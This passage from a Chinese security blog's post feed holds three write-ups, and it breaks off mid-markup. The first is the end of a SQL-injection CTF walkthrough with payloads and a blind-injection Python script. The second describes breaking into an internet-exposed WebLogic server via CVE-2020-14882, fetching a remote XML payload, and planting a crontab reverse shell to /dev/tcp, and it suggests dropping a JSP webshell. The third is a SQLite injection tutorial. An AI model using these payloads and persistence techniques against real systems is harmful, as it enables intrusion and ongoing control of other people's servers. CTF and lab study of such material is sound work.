class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/\\&#x27;/i&#x27;</span>, $_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select id from prob_assassin where pw like &#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class=\"subst\">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>]) <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;h2&gt;Hello <span class=\"subst\">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>] == <span class=\"string\">&#x27;admin&#x27;</span>) solve(<span class=\"string\">&quot;assassin&quot;</span>); </span><br><span class=\"line\">  highlight_file(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>like型注入，可以使用通配符<code>%</code>进行注入，先单个跑出来存在的字符为<code>def0129</code>，再进行一位一位的猜解，在输入<code>902%</code>的时候即可通关。</p>\n<h1 id=\"16-SUCCUBUS\"><a href=\"#16-SUCCUBUS\" class=\"headerlink\" title=\"16. SUCCUBUS\"></a>16. SUCCUBUS</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&quot;./config.php&quot;</span>; </span><br><span class=\"line\">  login_chk();</span><br><span class=\"line\">  $db = dbconnect();</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/prob|_|\\.|\\(\\)/i&#x27;</span>, $_GET[id])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/prob|_|\\.|\\(\\)/i&#x27;</span>, $_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/\\&#x27;/&#x27;</span>,$_GET[id])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;HeHe&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/\\&#x27;/&#x27;</span>,$_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;HeHe&quot;</span>);</span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select id from prob_succubus where id=&#x27;<span class=\"subst\">&#123;$_GET[id]&#125;</span>&#x27; and pw=&#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class=\"subst\">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>]) solve(<span class=\"string\">&quot;succubus&quot;</span>); </span><br><span class=\"line\">  highlight_file(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>过滤了单引号，但sql语句中存在两个可控点，可以在id参数输入<code>\\</code>将第一个单引号进行转义，后续pw即可输入注入语句进行SQL注入</p>\n<p>payload：<code>1\\&amp;pw=or+1=1--+</code></p>\n<p>闭合后的SQL语句为：<code>**select id from prob_succubus where id=&#39;1\\&#39; and pw=&#39;or 1=1-- &#39;**</code></p>\n<h1 id=\"17-zombie-assassin\"><a href=\"#17-zombie-assassin\" class=\"headerlink\" title=\"17. zombie_assassin\"></a>17. zombie_assassin</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&quot;./config.php&quot;</span>; </span><br><span class=\"line\">  login_chk(); </span><br><span class=\"line\">  $db = dbconnect();</span><br><span class=\"line\">  $_GET[<span class=\"string\">&#x27;id&#x27;</span>] = strrev(addslashes($_GET[<span class=\"string\">&#x27;id&#x27;</span>]));</span><br><span class=\"line\">  $_GET[<span class=\"string\">&#x27;pw&#x27;</span>] = strrev(addslashes($_GET[<span class=\"string\">&#x27;pw&#x27;</span>]));</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/prob|_|\\.|\\(\\)/i&#x27;</span>, $_GET[id])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/prob|_|\\.|\\(\\)/i&#x27;</span>, $_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select id from prob_zombie_assassin where id=&#x27;<span class=\"subst\">&#123;$_GET[id]&#125;</span>&#x27; and pw=&#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class=\"subst\">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>]) solve(<span class=\"string\">&quot;zombie_assassin&quot;</span>); </span><br><span class=\"line\">  highlight_file(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>思路跟16题基本差不多，只是多了个字符翻转</p>\n<p>Paylaod: <code>?id=%00&amp;pw=%231%20ro</code></p>\n<h1 id=\"18-NIGHTMARE\"><a href=\"#18-NIGHTMARE\" class=\"headerlink\" title=\"18. NIGHTMARE\"></a>18. NIGHTMARE</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&quot;./config.php&quot;</span>; </span><br><span class=\"line\">  login_chk(); </span><br><span class=\"line\">  $db = dbconnect(); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/prob|_|\\.|\\(\\)|#|-/i&#x27;</span>, $_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(strlen($_GET[pw])&gt;<span class=\"number\">6</span>) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select id from prob_nightmare where pw=(&#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27;) and id!=&#x27;admin&#x27;&quot;</span>; </span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class=\"subst\">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>]) solve(<span class=\"string\">&quot;nightmare&quot;</span>); </span><br><span class=\"line\">  highlight_file(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>Payload:<code>?pw=%27)=0;%00</code></p>\n<p>mysql连等，从左到右依次计算，<code>select id from prob_nightmare where pw=(&#39;&#39;)=0;</code>，pwd=’‘为false，然后0为false，false==false，所以最后语句为<code>select id from prob_nightmare where pw=true</code>，即可绕过</p>\n<h1 id=\"19-xavis\"><a href=\"#19-xavis\" class=\"headerlink\" title=\"19. xavis\"></a>19. xavis</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&quot;./config.php&quot;</span>; </span><br><span class=\"line\">  login_chk(); </span><br><span class=\"line\">  $db = dbconnect(); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/prob|_|\\.|\\(\\)/i&#x27;</span>, $_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/regex|like/i&#x27;</span>, $_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;HeHe&quot;</span>); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select id from prob_xavis where id=&#x27;admin&#x27; and pw=&#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class=\"subst\">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>]) <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;h2&gt;Hello <span class=\"subst\">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class=\"line\">   </span><br><span class=\"line\">  $_GET[pw] = addslashes($_GET[pw]); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select pw from prob_xavis where id=&#x27;admin&#x27; and pw=&#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(($result[<span class=\"string\">&#x27;pw&#x27;</span>]) &amp;&amp; ($result[<span class=\"string\">&#x27;pw&#x27;</span>] == $_GET[<span class=\"string\">&#x27;pw&#x27;</span>])) solve(<span class=\"string\">&quot;xavis&quot;</span>); </span><br><span class=\"line\">  highlight_file(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>由于结果是韩文，所以要用二分查找加快速度，查出来结果输入进去还是不太对</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\">requests.packages.urllib3.disable_warnings()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">cookie = &#123;<span class=\"string\">&quot;PHPSESSID&quot;</span>: <span class=\"string\">&quot;pq2v3qor5eic81d2jsjc3jl41d&quot;</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">&quot;1%27+or+id=&#x27;admin&#x27;+and+ord(mid(pw,&#123;&#125;,1))&gt;&#123;&#125;--+&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">temp = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">12</span>):</span><br><span class=\"line\">    min_num = <span class=\"number\">44032</span></span><br><span class=\"line\">    max_num = <span class=\"number\">55295</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"built_in\">abs</span>(max_num-min_num)&gt;<span class=\"number\">1</span>:</span><br><span class=\"line\">        mid = (max_num+min_num)//<span class=\"number\">2</span></span><br><span class=\"line\">        r = requests.get(<span class=\"string\">&quot;https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?pw=&quot;</span>+payload.<span class=\"built_in\">format</span>(i+<span class=\"number\">1</span>, mid), </span><br><span class=\"line\">            cookies=cookie, proxies=&#123;<span class=\"string\">&#x27;https&#x27;</span>: <span class=\"string\">&#x27;http://127.0.0.1:8080&#x27;</span>, <span class=\"string\">&#x27;http&#x27;</span>: <span class=\"string\">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;,</span><br><span class=\"line\">            verify=<span class=\"literal\">False</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;Hello admin&quot;</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">            min_num = mid</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            max_num = mid</span><br><span class=\"line\"></span><br><span class=\"line\">    temp = temp+<span class=\"built_in\">chr</span>(max_num)</span><br><span class=\"line\">    print(temp)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<p>跑出来的结果<code>우왕굳각각각각각각각각각</code></p>\n","categories":["CTF"],"tags":["SQL注入"]},{"title":"记一次实战weblogic渗透","url":"http://blog.le31ei.top/2020/11/16/记一次实战weblogic渗透/","content":"<p>某次测试中发现一个开放在外网的weblogic，版本为10.3.6，直接输入<code>/console</code>，就能打开管理页面</p>\n<p><img src=\"/2020/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98weblogic%E6%B8%97%E9%80%8F/image-20201116112750237.png\" alt=\"image-20201116112750237\"></p>\n<p><img src=\"/2020/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98weblogic%E6%B8%97%E9%80%8F/image-20201116112728397.png\" alt=\"image-20201116112728397\"></p>\n<p>直接测试<code>http://ip:port/console/css/%252e%252e%252fconsole.portal</code>能绕过console登录，直接进入后台，但后台权限较低，无法直接部署war包，于是根据vulhub，采用<code>FileSystemXmlApplicationContext</code>加载远程的xml进行攻击</p>\n<p><img src=\"/2020/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98weblogic%E6%B8%97%E9%80%8F/image-20201116114020053.png\" alt=\"image-20201116114020053\"></p>\n<p>在远程服务器写入xml文件，并使用python搭建http server，<code>python -m SimpleHTTPServer 5555</code></p>\n<p>xml文件内容写上反弹shell的命令，并在weblogic中访问以下命令：<br><code>http://ip:port/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://vps:5555/rce.xml&quot;)</code></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">beans</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">   <span class=\"attr\">xmlns:xsi</span>=<span class=\"string\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">   <span class=\"attr\">xsi:schemaLocation</span>=<span class=\"string\">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;pb&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;java.lang.ProcessBuilder&quot;</span> <span class=\"attr\">init-method</span>=<span class=\"string\">&quot;start&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">constructor-arg</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">list</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>bash<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>-c<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>&lt;![CDATA[bash -i &gt;&amp; /dev/tcp/ip/8888 0&gt;&amp;1]]&gt;<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;/<span class=\"name\">list</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">constructor-arg</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">beans</span>&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>但是结果发现虽然有连接回来，但是生成不了shell</p>\n<p><img src=\"/2020/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98weblogic%E6%B8%97%E9%80%8F/image-20201116115656814.png\" alt=\"image-20201116115656814\"></p>\n<p><img src=\"/2020/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98weblogic%E6%B8%97%E9%80%8F/image-20201116114531532.png\" alt=\"image-20201116114531532\"></p>\n<p>修改xml脚本，联想到平时在红蓝项目中，采用定时反弹shell的方式，直接写入crontab进行定时反弹，而不是在当前session进行反弹，修改后xml如下：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">beans</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">   <span class=\"attr\">xmlns:xsi</span>=<span class=\"string\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">   <span class=\"attr\">xsi:schemaLocation</span>=<span class=\"string\">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;pb&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;java.lang.ProcessBuilder&quot;</span> <span class=\"attr\">init-method</span>=<span class=\"string\">&quot;start&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">constructor-arg</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">list</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>bash<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>-c<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>&lt;![CDATA[echo -e &quot;*/1 * * * * exec 9&lt;&gt; /dev/tcp/ip/9998;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i&quot;|crontab -]]&gt;<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;/<span class=\"name\">list</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">constructor-arg</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>这样每隔一分钟，服务器会定时反弹shell回来，这种方式避免了weblogic在加载xml时就回弹shell，导致可能不成功的情况。</p>\n<p>收到了反弹的shell</p>\n<p><img src=\"/2020/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98weblogic%E6%B8%97%E9%80%8F/image-20201116114812911.png\" alt=\"image-20201116114812911\"></p>\n<p>反弹的bash shell不太好找web相关的配置参数，比如web.xml文件等，于是采用find命令全局查找，找到相关的web目录如下：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/app/weblogic/Oracle/Middleware/user_projects/domains/mweb_domain/servers/mwebServer/tmp/_WL_user/mweb/&#123;username&#125;/war/</span><br></pre></td></tr></table></figure>\n\n<p>可使用<code>wget</code>在该目录下写入jsp或者jspx的webshell</p>\n<p>以上便是本次实际应用中碰到的weblogic渗透，做此记录。</p>\n<p><strong>参考文档</strong></p>\n<ol>\n<li><a href=\"https://github.com/vulhub/vulhub/blob/master/weblogic/CVE-2020-14882/README.zh-cn.md\">https://github.com/vulhub/vulhub/blob/master/weblogic/CVE-2020-14882/README.zh-cn.md</a></li>\n<li><a href=\"https://github.com/jas502n/CVE-2020-14882\">https://github.com/jas502n/CVE-2020-14882</a></li>\n</ol>\n","categories":["Pentest"],"tags":["weblogic"]},{"title":"sqlite注入","url":"http://blog.le31ei.top/2020/11/10/sqlite注入/","content":"<p>sqlite手工注入基本跟mysql一致，只是函数没法通用，查库名和列名不一致</p>\n<p>sqlite数据库中只存在<code>sqlite_master</code>和当前数据库。</p>\n<p><strong>查询当前表名</strong></p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">index.php?id=1 union select 1,name,3,4 from sqlite_master where type=&#x27;table&#x27; limit 0,1</span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong>查询列名</strong></p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">index.php?id=1 union select 1,sql,3,4 from sqlite_master where type=&#x27;table&#x27; and name=&#x27;flag&#x27;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong>题目解析</strong></p>\n<p><code>https://ringzer0ctf.com/challenges/40/?id=MQ==</code></p>\n<p>该题目对id做了base64编码，存在sqlite注入，题目提示，id可以用<code>)</code>进行闭合。</p>\n<p><img src=\"/2020/11/10/sqlite%E6%B3%A8%E5%85%A5/image-20201110151126659.png\" alt=\"image-20201110151126659\"></p>\n<p><strong>查询表名</strong></p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">GET</span> <span class=\"string\">/challenges/40/?id=2)</span> union <span class=\"string\">select</span> name,2,3 <span class=\"string\">from</span> sqlite_master <span class=\"string\">where</span> type=&#x27;table&#x27; <span class=\"string\">limit</span> 0,1-- <span class=\"string\">HTTP/1.1</span></span><br><span class=\"line\"><span class=\"string\">Host:</span> ringzer0ctf.com</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: close</span><br><span class=\"line\"><span class=\"attribute\">Pragma</span>: no-cache</span><br><span class=\"line\"><span class=\"attribute\">Cache-Control</span>: no-cache</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span>: 1</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\"><span class=\"attribute\">Sec-Fetch-Site</span>: none</span><br><span class=\"line\"><span class=\"attribute\">Sec-Fetch-Mode</span>: navigate</span><br><span class=\"line\"><span class=\"attribute\">Sec-Fetch-User</span>: ?1</span><br><span class=\"line\"><span class=\"attribute\">Sec-Fetch-Dest</span>: document</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: zh-CN,zh;q=0.9</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2020/11/10/sqlite%E6%B3%A8%E5%85%A5/image-20201110151309780.png\" alt=\"image-20201110151309780\"></p>\n<p><strong>查询列名</strong></p>\n<p>查询结果是创建表的语句</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span 